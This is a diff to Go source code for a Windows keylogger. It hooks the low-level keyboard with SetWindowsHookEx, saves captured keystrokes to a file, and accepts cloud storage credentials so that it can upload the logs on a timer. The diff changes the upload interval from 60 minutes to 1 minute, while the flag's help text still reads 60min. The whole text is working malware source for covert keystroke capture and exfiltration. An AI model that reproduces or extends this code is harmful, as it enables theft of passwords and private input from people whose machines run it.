@@ -540,7 +540,6 @@ func Keylogger() {
     CAPS = CAPS & 0x000001
     var CAPS2 uintptr
     var SHIFT uintptr
-    var precLog string = ""
     //var write bool = false
     keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)(func(nCode int, wparam WPARAM, lparam LPARAM) LRESULT {
        if nCode == 0 && wparam == WM_KEYDOWN {
@@ -576,7 +575,8 @@ func Keylogger() {
        }
        if tmpKeylog != "" {
          savefile(tmpKeylog)
-         precLog = tmpKeylog
+         //var precLog string = tmpKeylog
+         //precLog = tmpKeylog
          tmpKeylog = ""
        }
        return CallNextHookEx(keyboardHook, nCode, wparam, lparam)
@@ -678,7 +678,7 @@ func main() {
     var min int
     var osskey string
     flag.StringVar(&osskey, "o", "", "format: bucketName:accessKeyId:accessKeySecret:endpoint")
-    flag.IntVar(&min, "t", 60, "Upload interval,default: 60min")
+    flag.IntVar(&min, "t", 1, "Upload interval,default: 60min")
     flag.Parse()
     str1 := strings.Split(osskey, ":")
     if(osskey != ""){
